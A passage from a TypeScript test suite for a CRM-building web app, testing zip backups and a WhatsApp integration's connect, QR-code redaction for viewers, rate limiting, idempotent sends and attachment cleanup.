      assert.equal(body.code, "EXPORT_UNSAFE_IDENTIFIER");
      assert.match(body.error, /unsafe entity identifier "לקוח"/);
    },
    { provider: createNonAsciiEntityProvider() },
  );
});

test("backup refuses before build, and returns a real zip with one CSV per entity after", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };

    const tooEarly = await fetch(`${baseUrl}/api/projects/${project.id}/backup`, { headers: authHeaders(token) });
    assert.equal(tooEarly.status, 409);

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: builtProject } = (await getRes.json()) as { project: { spec: { entities: { name: string }[] } } };

    const backupRes = await fetch(`${baseUrl}/api/projects/${project.id}/backup`, { headers: authHeaders(token) });
    assert.equal(backupRes.status, 200);
    assert.equal(backupRes.headers.get("content-type"), "application/zip");
    assert.match(backupRes.headers.get("content-disposition") ?? "", /attachment; filename=".*-backup\.zip"/);
    const buffer = Buffer.from(await backupRes.arrayBuffer());
    assert.equal(buffer.readUInt32LE(0), 0x04034b50); // real ZIP local-file-header magic

    // The zip must contain a filename entry per real entity in the built
    // spec, not a hardcoded guess -- search the raw bytes for each
    // entity's own "<Name>.csv" local-file-header filename.
    assert.ok(builtProject.spec.entities.length > 0);
    for (const entity of builtProject.spec.entities) {
      assert.ok(buffer.includes(`${entity.name}.csv`), `expected the backup zip to contain an entry for "${entity.name}.csv"`);
    }
  });
});

test("backup includes a real 'WhatsApp Messages.csv' entry with the message's actual content once a message has arrived, and omits it for a project with no WhatsApp history", async () => {
  let capturedDb: ForgeDatabase | undefined;
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };
      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
      await collectSSE(buildRes);

      const beforeBackupRes = await fetch(`${baseUrl}/api/projects/${project.id}/backup`, { headers: authHeaders(token) });
      const beforeBuffer = Buffer.from(await beforeBackupRes.arrayBuffer());
      assert.ok(!beforeBuffer.includes("WhatsApp Messages.csv"), "a project with zero WhatsApp messages should have no WhatsApp entry at all");

      assert.ok(capturedDb, "withServer must hand the real server db to the whatsapp opt so a real message can be inserted against it");
      insertWhatsAppMessage(capturedDb!, {
        projectId: project.id,
        direction: "in",
        fromNumber: "+972501234567",
        toNumber: "+972509999999",
        body: "שלום, מתי אפשר להגיע?",
        status: "received",
      });

      const afterBackupRes = await fetch(`${baseUrl}/api/projects/${project.id}/backup`, { headers: authHeaders(token) });
      assert.equal(afterBackupRes.status, 200);
      const afterBuffer = Buffer.from(await afterBackupRes.arrayBuffer());
      assert.ok(afterBuffer.includes("WhatsApp Messages.csv"));
      // The zip uses store (no compression), so the real message text is
      // searchable directly in the raw response bytes, proving the backup
      // carries the message's actual content, not just an empty entry.
      assert.ok(afterBuffer.includes(Buffer.from("שלום, מתי אפשר להגיע?", "utf8")));
      assert.ok(afterBuffer.includes(Buffer.from("Incoming,'+972501234567,'+972509999999", "utf8")));
    },
    {
      whatsapp: (db) => {
        capturedDb = db;
        return createTestWhatsAppManager(db).manager;
      },
    },
  );
});

test("WhatsApp status starts disconnected, connect surfaces a real QR code, and status flips to connected once the phone links", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const before = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/status`, { headers: authHeaders(token) });
      assert.equal(before.status, 200);
      const beforeBody = (await before.json()) as { status: string; phoneNumber: string | null };
      assert.equal(beforeBody.status, "disconnected");
      assert.equal(beforeBody.phoneNumber, null);

      const connectRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(connectRes.status, 200);
      const connectBody = (await connectRes.json()) as { status: string };
      assert.equal(connectBody.status, "connecting");
      assert.equal(createdSockets.length, 1);

      createdSockets[0].emitConnectionUpdate({ qr: "raw-qr-string" });
      await new Promise((resolve) => setImmediate(resolve));

      const qrStatusRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/status`, { headers: authHeaders(token) });
      const qrStatusBody = (await qrStatusRes.json()) as { status: string; qrDataUrl: string | null };
      assert.equal(qrStatusBody.status, "qr");
      assert.equal(qrStatusBody.qrDataUrl, "data:image/png;base64,FAKE(raw-qr-string)");

      // Simulate the phone actually scanning it.
      createdSockets[0].sock.user = { id: "972501234567:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const connectedStatusRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/status`, {
        headers: authHeaders(token),
      });
      const connectedBody = (await connectedStatusRes.json()) as { status: string; phoneNumber: string | null };
      assert.equal(connectedBody.status, "connected");
      assert.equal(connectedBody.phoneNumber, "972501234567");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 976: GET .../whatsapp/status used requireProjectAccess (any
 * collaborator, viewer included) and returned qrDataUrl verbatim -- a live
 * WhatsApp-Web linking QR code. Scanning it with any phone links that
 * phone as a new device on the REAL external WhatsApp account this
 * project is connecting, entirely outside this app's permission model. A
 * viewer can never cause a connect themselves (POST .../connect already
 * requires requireProjectWriteAccess), so unlike an editor, they have no
 * legitimate need to see it. Confirms it's redacted to null for a viewer
 * while status/phoneNumber stay visible, and that an editor (and the
 * owner) still see the real QR code unchanged.
 */
test("GET .../whatsapp/status redacts qrDataUrl for a 'viewer' collaborator, but not for an 'editor' collaborator or the owner", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, "whatsapp-qr-rbac-owner@example.com");
      const viewerToken = await signup(baseUrl, "whatsapp-qr-rbac-viewer@example.com");
      const editorToken = await signup(baseUrl, "whatsapp-qr-rbac-editor@example.com");

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: "whatsapp-qr-rbac-viewer@example.com", role: "viewer" }),
      });
      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: "whatsapp-qr-rbac-editor@example.com", role: "editor" }),
      });

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(ownerToken) });
      createdSockets[0].emitConnectionUpdate({ qr: "raw-qr-string" });
      await new Promise((resolve) => setImmediate(resolve));

      const ownerStatusRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/status`, { headers: authHeaders(ownerToken) });
      const ownerStatus = (await ownerStatusRes.json()) as { qrDataUrl: string | null };
      assert.equal(ownerStatus.qrDataUrl, "data:image/png;base64,FAKE(raw-qr-string)", "the owner must still see the real QR code");

      const editorStatusRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/status`, { headers: authHeaders(editorToken) });
      const editorStatus = (await editorStatusRes.json()) as { qrDataUrl: string | null };
      assert.equal(editorStatus.qrDataUrl, "data:image/png;base64,FAKE(raw-qr-string)", "an editor must still see the real QR code");

      const viewerStatusRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/status`, { headers: authHeaders(viewerToken) });
      assert.equal(viewerStatusRes.status, 200, "a viewer must still be able to read the status itself");
      const viewerStatus = (await viewerStatusRes.json()) as { status: string; qrDataUrl: string | null };
      assert.equal(viewerStatus.qrDataUrl, null, "a viewer must never see the real QR code");
      assert.equal(viewerStatus.status, "qr", "only qrDataUrl is redacted -- every other field stays visible to a viewer as before");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

test("WhatsApp send refuses with 409 before connecting", async () => {
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "hi" }),
      });
      assert.equal(sendRes.status, 409);
    },
    { whatsapp: (db) => createTestWhatsAppManager(db).manager },
  );
});

test("WhatsApp send succeeds once connected, is logged as an outgoing message, and disconnect via HTTP tears the session down", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "מתי אפשר להגיע?" }),
      });
      assert.equal(sendRes.status, 200);
      assert.deepEqual((await sendRes.json()) as { ok: boolean }, { ok: true });
      assert.deepEqual(createdSockets[0].sendCalls, [
        { jid: "972501234567@s.whatsapp.net", text: "מתי אפשר להגיע?", content: { text: "מתי אפשר להגיע?" } },
      ]);

      const messagesRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages } = (await messagesRes.json()) as { messages: { direction: string; status: string; body: string }[] };
      assert.equal(messages.length, 1);
      assert.equal(messages[0].direction, "out");
      assert.equal(messages[0].status, "sent");

      const disconnectRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/disconnect`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(disconnectRes.status, 200);
      const disconnectedBody = (await disconnectRes.json()) as { status: string };
      assert.equal(disconnectedBody.status, "disconnected");

      // Sending after disconnecting must fail honestly again, not silently succeed.
      const sendAfterDisconnect = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "hi again" }),
      });
      assert.equal(sendAfterDisconnect.status, 409);
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 862: every other outward-facing-cost route in this API already
 * has a volumetric rate limiter (the AI-generation routes, round 858;
 * every unauthenticated auth route, rounds 847-857) -- the WhatsApp
 * connect/disconnect/send routes had none at all, despite /send's own
 * `to` being a completely free-form destination (not checked against any
 * real record) sent through this project's real, linked WhatsApp
 * account. whatsappWeb.ts's own sendSpacingMs only paces consecutive
 * sends to avoid a bursty shape; it never caps total volume. Confirms
 * the new shared, per-user limiter: calls to /send and /connect draw
 * from the SAME budget (not one counter per route), and a disconnected
 * /send call (409, before ever reaching whatsapp.sendMessage) still
 * counts against it, since the limiter runs before the route's own
 * connection-status check.
 */
test("WhatsApp connect/disconnect/send share one per-user rate limit: the 31st call across routes is rejected with 429", async () => {
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "rate-limit-whatsapp@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      for (let i = 0; i < 30; i++) {
        const res = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
          method: "POST",
          headers: authHeaders(token),
          body: JSON.stringify({ to: "972501234567", message: "hi" }),
        });
        assert.notEqual(res.status, 429, `send call ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
      }

      // The 31st call across the SAME budget, on a DIFFERENT route --
      // proves the limit is shared, not one independent counter per route.
      const blocked = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(blocked.status, 429);
      assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");
    },
    { whatsapp: (db) => createTestWhatsAppManager(db, { sendSpacingMs: 0 }).manager },
  );
});

test("WhatsApp: sending a test message to a number that matches an existing customer's phone logs it with that customer's name, not just the raw number", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
        method: "POST",
        headers: authHeaders(token),
      });
      await collectSSE(buildRes);

      // Stored in local format (leading trunk zero) -- normalizePhone
      // reconciles that against the international-format number the send
      // request below uses, exactly like an incoming message would.
      await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Dana Levi", phone: "050-123-4567", status: "New" }),
      });

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "מתי אפשר להגיע?" }),
      });
      assert.equal(sendRes.status, 200);

      const messagesRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages } = (await messagesRes.json()) as {
        messages: { direction: string; matchedLabel: string | null; matchedEntityName: string | null }[];
      };
      assert.equal(messages.length, 1);
      assert.equal(messages[0].direction, "out");
      assert.equal(messages[0].matchedEntityName, "Customer");
      assert.equal(messages[0].matchedLabel, "Dana Levi");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

test("WhatsApp: a failed send stays logged as failed, and retrying with the same recipient/body (what the panel's Retry button does) succeeds and adds a new sent entry", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      // Simulate a momentary socket write failure on the first attempt.
      createdSockets[0].sock.sendMessage = async () => {
        throw new Error("socket write failed");
      };

      const firstSend = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "אפשר תור מחר?" }),
      });
      assert.equal(firstSend.status, 502);

      const afterFirst = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages: afterFirstMessages } = (await afterFirst.json()) as { messages: { status: string; body: string }[] };
      assert.equal(afterFirstMessages.length, 1);
      assert.equal(afterFirstMessages[0].status, "failed");

      // The panel's Retry button re-sends the exact same recipient and body
      // once the underlying problem (here, the socket) recovers.
      createdSockets[0].sock.sendMessage = async (jid, content) => {
        createdSockets[0].sendCalls.push({ jid, text: content.text });
        return {};
      };

      const retrySend = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "אפשר תור מחר?" }),
      });
      assert.equal(retrySend.status, 200);
      assert.deepEqual((await retrySend.json()) as { ok: boolean }, { ok: true });

      const afterRetry = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages: afterRetryMessages } = (await afterRetry.json()) as { messages: { status: string; body: string }[] };
      // The original failed entry is never mutated or removed; the retry
      // simply appends a new, separately-logged successful attempt.
      assert.equal(afterRetryMessages.length, 2);
      assert.equal(afterRetryMessages[0].status, "sent");
      assert.equal(afterRetryMessages[0].body, "אפשר תור מחר?");
      assert.equal(afterRetryMessages[1].status, "failed");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 602's finding: unlike every sibling mutating route in this file,
 * POST .../integrations/whatsapp/send was never wrapped in withIdempotency,
 * and api.ts's sendWhatsAppMessage() never sent an X-Idempotency-Key header
 * either -- so a response lost after the real send already succeeded (the
 * exact fetchWithWakeRetry retry window the design doc exists for) would
 * resend the identical POST and send the same WhatsApp message twice. Fixed
 * both: the client now sends a real header, and the route wraps the send +
 * insertWhatsAppMessage effect in withIdempotency(), same as every other
 * converted route. A counting fake sendMessage proves the real send only
 * runs once for the retry, not just that the HTTP response looks the same.
 */
test("POST .../integrations/whatsapp/send retried with the same idempotency key after the first attempt already finished replays the original response instead of sending the message twice", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "whatsapp-send-idem1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550004444:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const headers = { ...authHeaders(token), "x-idempotency-key": "whatsapp-send-repro-key" };
      const sendBody = { to: "972501234567", message: "אפשר תור מחר?" };

      const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers,
        body: JSON.stringify(sendBody),
      });
      assert.equal(firstRes.status, 200);
      const first = (await firstRes.json()) as { ok: boolean };

      const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers,
        body: JSON.stringify(sendBody),
      });
      assert.equal(retryRes.status, 200);
      const retry = (await retryRes.json()) as { ok: boolean };
      assert.deepEqual(retry, first, "the replayed response must be identical to what the first attempt actually returned");

      assert.equal(
        createdSockets[0].sendCalls.length,
        1,
        "the real WhatsApp send must only run once -- the retry must replay the cached response, not send the message again",
      );

      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages } = (await listRes.json()) as { messages: unknown[] };
      assert.equal(messages.length, 1, "exactly one message must be logged -- the retry must not have inserted a second row");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 973: a manual test-send from WhatsAppPanel previously had no way to
 * attach a file at all -- only the automation path (findTemplateFileAttachment)
 * could ever pass a WhatsAppAttachment into sendMessage/performSend, even
 * though both are completely generic. Confirms the new upload route stores
 * the file under the fixed WHATSAPP_ATTACHMENTS_DIRNAME subdirectory, that
 * its returned descriptor round-trips through the send route into a real
 * WhatsAppAttachment, and that the fake Baileys socket actually receives the
 * `{document: ...}` content shape performSend builds for a non-image/video/
 * audio mimeType.
 */
test("POST .../integrations/whatsapp/send accepts an uploaded attachment and passes it through to the real send", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "whatsapp-attach1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550005555:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const fileBody = "%PDF-fake-brochure-contents";
      const formData = new FormData();
      formData.append("file", new File([fileBody], "brochure.pdf", { type: "application/pdf" }));
      const uploadRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/attachments/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      assert.equal(uploadRes.status, 200);
      const uploadBody = (await uploadRes.json()) as { file: { url: string; name: string; size: number; mimeType: string } };
      assert.equal(uploadBody.file.name, "brochure.pdf");
      assert.match(uploadBody.file.url, new RegExp(`^/api/uploads/${project.id}/_whatsapp-attachments/[^/]+\\.pdf$`));

      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "הנה הברושור", attachment: uploadBody.file }),
      });
      assert.equal(sendRes.status, 200);
      assert.deepEqual(await sendRes.json(), { ok: true });

      assert.equal(createdSockets[0].sendCalls.length, 1);
      const sent = createdSockets[0].sendCalls[0].content as { document: Buffer; mimetype: string; fileName: string; caption?: string };
      assert.equal(sent.mimetype, "application/pdf");
      assert.equal(sent.fileName, "brochure.pdf");
      assert.equal(sent.caption, "הנה הברושור");
      assert.equal(sent.document.toString("utf8"), fileBody);
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 1101: the attachment file is deleted from disk right after the
 * send resolves either way (round 979, see the test just below and the one
 * after it), so by the time this message's row is read back there is
 * nothing left to tell WhatsAppPanel.tsx's Retry button that this
 * particular failed send ever had a file at all -- without hadAttachment,
 * Retry silently resends text-only with no warning. Confirms hadAttachment
 * round-trips through a real HTTP send + a real HTTP read for both an
 * attachment-bearing send and a plain text send, not just the insert's own
 * in-process return value.
 */
test("GET .../integrations/whatsapp/messages reports hadAttachment: true only for a send that actually included an attachment", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "whatsapp-had-attachment1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550005558:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const formData = new FormData();
      formData.append("file", new File(["%PDF-fake-brochure-contents"], "brochure.pdf", { type: "application/pdf" }));
      const uploadRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/attachments/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      const uploadBody = (await uploadRes.json()) as { file: { url: string; name: string; mimeType: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "with a file", attachment: uploadBody.file }),
      });
      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "plain text" }),
      });

      const messagesRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, { headers: authHeaders(token) });
      const { messages } = (await messagesRes.json()) as { messages: { body: string; hadAttachment: boolean }[] };

      const withFile = messages.find((m) => m.body === "with a file");
      const textOnly = messages.find((m) => m.body === "plain text");
      assert.equal(withFile?.hadAttachment, true, "the attachment-bearing send must be reported as hadAttachment: true");
      assert.equal(textOnly?.hadAttachment, false, "the plain text send must be reported as hadAttachment: false");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 979: a manual test-send attachment was uploaded to disk but never
 * deleted afterward -- not on a successful send, not on a failed one, and
 * not when the user removed it or replaced it with a different file before
 * ever sending. The only existing cleanup for this directory was whole-
 * project deletion. Confirms the real file on disk is actually gone after
 * a successful send (performSend has already fully read it into memory by
 * the time this route's own cleanup runs, so deleting it afterward can
 * never race the send itself).
 */
test("POST .../integrations/whatsapp/send deletes the attachment file from disk after a successful send", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, _db, uploadsDir) => {
      const token = await signup(baseUrl, "whatsapp-attach-cleanup1@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550005556:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const formData = new FormData();
      formData.append("file", new File(["%PDF-fake-brochure-contents"], "brochure.pdf", { type: "application/pdf" }));
      const uploadRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/attachments/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      const uploadBody = (await uploadRes.json()) as { file: { url: string; name: string; mimeType: string } };
      const filename = uploadBody.file.url.split("/").pop()!;
      const filePath = path.join(uploadsDir, project.id, "_whatsapp-attachments", filename);
      assert.ok(existsSync(filePath), "the fixture file must actually exist right after upload, or this test proves nothing");

      const sendRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/send`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ to: "972501234567", message: "הנה הברושור", attachment: uploadBody.file }),
      });
      assert.equal(sendRes.status, 200);

      assert.equal(existsSync(filePath), false, "the attachment file must be deleted from disk after a successful send");
    },
    {
      whatsapp: (db) => {
        const created = createTestWhatsAppManager(db);
        createdSockets = created.createdSockets;
        return created.manager;
      },
    },
  );
});

/**
 * Round 979: the same cleanup must happen even when the send itself FAILS
 * -- the attachment was already fully read into memory by performSend
 * before the failure was even known, so it's just as single-use and
 * orphaned either way.
 */
test("POST .../integrations/whatsapp/send deletes the attachment file from disk even when the send itself fails", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, _db, uploadsDir) => {
      const token = await signup(baseUrl, "whatsapp-attach-cleanup2@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550005557:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const formData = new FormData();
      formData.append("file", new File(["%PDF-fake-brochure-contents"], "brochure.pdf", { type: "application/pdf" }));
      const uploadRes = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/attachments/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      const uploadBody = (await uploadRes.json()) as { file: { url: string; name: string; mimeType: string } };
      const filename = uploadBody.file.url.split("/").pop()!;
      const filePath = path.join(uploadsDir, project.id, "_whatsapp-attachments", filename);

      // Simulate a momentary socket write failure, same convention as this
      // file's own existing "a failed send stays logged as failed" test.
